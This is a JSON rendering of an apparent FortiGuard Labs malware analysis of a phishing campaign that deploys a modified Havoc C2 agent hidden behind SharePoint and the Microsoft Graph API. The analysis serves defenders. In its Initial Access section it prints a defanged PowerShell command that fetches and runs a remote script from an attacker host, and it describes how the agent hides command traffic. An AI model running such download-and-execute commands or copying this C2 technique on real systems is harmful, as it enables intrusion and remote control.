@@ -1,0 +1,198 @@
+[
+    {
+        "level": 0,
+        "content": "Havoc: SharePoint with Microsoft Graph API turns into FUD C2"
+    },
+    {
+        "level": 3,
+        "content": "Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High"
+    },
+    {
+        "level": 3,
+        "content": "Havoc is a powerful command-and-control (C2) framework. Like other well-known C2 frameworks, such asCobalt Strike,Silver, andWinos4.0, Havoc has been used inthreat campaignsto gain full control over the target. Additionally, It is open-source and available on GitHub, making it easier for threat actors to modify it to evade detection."
+    },
+    {
+        "level": 3,
+        "content": "FortiGuard Labs recently discovered a phishing campaign that combines ClickFix and multi-stage malware to deploy a modified Havoc Demon Agent. The threat actor hides each malware stage behind a SharePoint site and uses a modified version of Havoc Demon in conjunction with the Microsoft Graph API to obscure C2 communications within trusted, well-known services. Figure 1 shows the attack chain."
+    },
+    {
+        "level": 1,
+        "content": "Initial Access"
+    },
+    {
+        "level": 3,
+        "content": "The attack campaign starts with a phishing email containing an HTML file as an attachment, as illustrated in Figure 2. It uses a brief explanation and an urgent tone to prompt the recipient to open the attachment immediately."
+    },
+    {
+        "level": 3,
+        "content": "The attachment, “Documents.html,” is a ClickFix attack that embeds a fake error message and instructions in HTML to deceive users into copying and pasting a malicious PowerShell command into their terminal or PowerShell, ultimately executing malicious code."
+    },
+    {
+        "level": 3,
+        "content": "Decoding the base64-encoded string shown in Figure 3 reveals a PowerShell command that downloads and executes a remote PowerShell script."
+    },
+    {
+        "level": 3,
+        "content": "powershell -w h -c \"iwr ‘hxxps://hao771[.]sharepoint.com/_layouts/15/download.aspx?share=EU7smZuKo-pDixZ26BSAaX0BVVcF5VkOc7qEvjsDSAH9OQ'|iex\""
+    },
+    {
+        "level": 1,
+        "content": "payload_20250112_074319.ps1"
+    },
+    {
+        "level": 3,
+        "content": "The Script file is hosted in SharePoint and controlled by the threat actor. When the script runs, it checks whether the execution environment is a sandbox by verifying the number of domain computers. It then deletes all registry entries under HKCU:\\Software\\Microsoft with names starting with \"zr_\" and adds the specified property as an infection marker, as shown in Figure 4."
+    },
+    {
+        "level": 3,
+        "content": "Next, the script verifies the existence of pythonw.exe. If it’s not found, it downloads the Python interpreter. Otherwise, it directly runs the Python script. Finally, the remote Python script is retrieved and executed in hidden windows to obscure malicious activity, as shown in Figure 5."
+    },
+    {
+        "level": 1,
+        "content": "Python Shellcode Loader - payload_20250107_015913.py"
+    },
+    {
+        "level": 3,
+        "content": "Like the PowerShell script, the Python script is hosted on the same SharePoint. It contains debug information written in Russian and serves as a shellcode loader."
+    },
+    {
+        "level": 3,
+        "content": "We executed the script directly with the Python interpreter in the terminal. The log displays “Выделение памяти” (memory allocation), \"Запись в память” (write to memory), \"Выполнение shellcode” (execution of shellcode), and \" Завершение выполнения скрипта” (script execution completion) in sequence, indicating successful shellcode execution, as seen in Figure 6."
+    },
+    {
+        "level": 1,
+        "content": "KaynLdr"
+    },
+    {
+        "level": 3,
+        "content": "KaynLdr is a Github Shellcode Loader designed to reflectively load an embedded DLL. It complicates analysis by using API hashing with a modified DJB2 algorithm and leverages resolved ntdll APIs for memory allocation and mapping. The instruction “call rax” executes the embedded DLL's entry point, as shown in Figure 7."
+    },
+    {
+        "level": 1,
+        "content": "Havoc Demon DLL"
+    },
+    {
+        "level": 3,
+        "content": "Havoc is an open-source post-exploitation command and control framework used in red teaming exercises andattack campaignsto gain complete control over compromised targets."
+    },
+    {
+        "level": 3,
+        "content": "In this attack campaign, we observed that the threat actor uses Havoc in conjunction with the Microsoft Graph API to conceal C2 communication within well-known services."
+    },
+    {
+        "level": 3,
+        "content": "The modified Havoc Demon DLL still starts with DemonInit and uses the same hash algorithm as KaynLdr to retrieve the necessary APIs and initialize the configuration objects."
+    },
+    {
+        "level": 3,
+        "content": "The second function, “SharePointC2Init,” initializes files on the actors' SharePoint site using the Microsoft Graph API."
+    },
+    {
+        "level": 3,
+        "content": "It first combines the hardcoded shared secret with the necessary parameters for a POST request. It then sends the request to the /token endpoint of the Microsoft Identity Platform to obtain access tokens for Microsoft Graph APIs."
+    },
+    {
+        "level": 3,
+        "content": "Next, it utilizes the obtained token to create two files in SharePoint's default document library by making a PUT request, as shown in Figure 10."
+    },
+    {
+        "level": 3,
+        "content": "The Havoc AgentID generates the VictimID as a filename, concatenated with the suffix “pD9-tKout/pD9-tKin” to indicate their purpose."
+    },
+    {
+        "level": 3,
+        "content": "The initial packet sent to C2 is a CheckIn request containing data gathered from the DemonMetaData function. In this step, the victim's information—such as Host Name, User Name, Domain Name, IP Address, Process Details, OS Information, whether the user has an elevated account, and the configuration in the Demon DLL—is sent to the C2 server."
+    },
+    {
+        "level": 3,
+        "content": "All content is encrypted using the AES-256 algorithm in CTR mode with a randomly generated 256-bit key and a 128-bit IV. Finally, it is combined with the header, as illustrated in Figure 11, before being sent to the C2 server via the TransportSend function."
+    },
+    {
+        "level": 3,
+        "content": "The TransportSend function has been modified to communicate with the C2 by accessing two files: {VictimID}pD9-tKout and {VictimID}pD9-tKin."
+    },
+    {
+        "level": 3,
+        "content": "It updates the request to the “{VictimID}pD9-tKout” file and then retrieves the response from the C2 by using Microsoft Graph API with the GET method to access the contents of the ‘{VictimID}pD9-tKin’ file. If the response is successfully retrieved, the content of file '{VictimID}pD9-tKin' is immediately erased."
+    },
+    {
+        "level": 3,
+        "content": "Next, the content in the response is compared with the AgentID. If they match, the session.connected flag is set, and it enters the dispatcher routine to await new tasks from the attacker."
+    },
+    {
+        "level": 3,
+        "content": "In the dispatcher routine, the agent sends a 'Get Job' request and parses the response into Command ID, Request ID, and task. Although we only observed DEMON_COMMAND_NO_JOB (Command ID: 0xA) during our analysis, as shown in below, we found that the task would be decrypted and executed if a different command ID exists and is not 0xA in the program."
+    },
+    {
+        "level": 3,
+        "content": "The supported commands are the same as those in Havoc Github, as shown in Figure 14. They include gathering information about the target, file operations, command and payload execution, token manipulation, and Kerberos Attacks."
+    },
+    {
+        "level": 1,
+        "content": "Conclusion"
+    },
+    {
+        "level": 3,
+        "content": "In addition to staying alert for phishing emails, guided messages that encourage opening a terminal or PowerShell must be handled with extra caution to prevent inadvertently downloading and executing malicious commands."
+    },
+    {
+        "level": 3,
+        "content": "In this article, we uncovered the execution flow and the altered open-source post-exploitation framework used in this attack. Public services once again play a crucial role in the attack campaign, now further integrated with modified Havoc Demon to hide malicious communication within the Microsoft Graph API, making identification and detection even more challenging."
+    },
+    {
+        "level": 2,
+        "content": "Fortinet Protections"
+    },
+    {
+        "level": 3,
+        "content": "The malware described in this report are detected and blocked byFortiGuard Antivirusas:"
+    },
+    {
+        "level": 3,
+        "content": "HTML/Agent.A5D4!trPowerShell/MalwThreat!ebc5FTPython/Agent.DF60!trW64/Havoc.L!tr"
+    },
+    {
+        "level": 3,
+        "content": "FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected."
+    },
+    {
+        "level": 3,
+        "content": "TheFortiGuard CDR(content disarm and reconstruction) service can disarm the malicious macros within the document."
+    },
+    {
+        "level": 3,
+        "content": "FortiGuard Labs provides theBackdoor.Havoc.AgentIPS signature to block Havoc C2 network communications."
+    },
+    {
+        "level": 3,
+        "content": "We also suggest that organizations take the free FortinetFortinet Certified Fundamentals (FCF)cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology."
+    },
+    {
+        "level": 3,
+        "content": "FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources."
+    },
+    {
+        "level": 3,
+        "content": "If you believe this or any other cybersecurity threat has impacted your organization, please contact the GlobalFortiGuard Incident Response Team."
+    },
+    {
+        "level": 1,
+        "content": "IOCs"
+    },
+    {
+        "level": 2,
+        "content": "C2"
+    },
+    {
+        "level": 3,
+        "content": "hao771[.]sharepoint.com"
+    },
+    {
+        "level": 2,
+        "content": "Files"
+    },
+    {
+        "level": 3,
+        "content": "51796effe230d9eca8ec33eb17de9c27e9e96ab52e788e3a9965528be2902330989f58c86343704f143c0d9e16893fad98843b932740b113e8b2f8376859d2ddA5210aaa9eb51e866d9c2ef17f55c0526732eacb1a412b910394b6b51246b7dacc151456cf7df7ff43113e5f82c4ce89434ab40e68cd6fb362e4ae4f70ce65b3"
+    }
+]
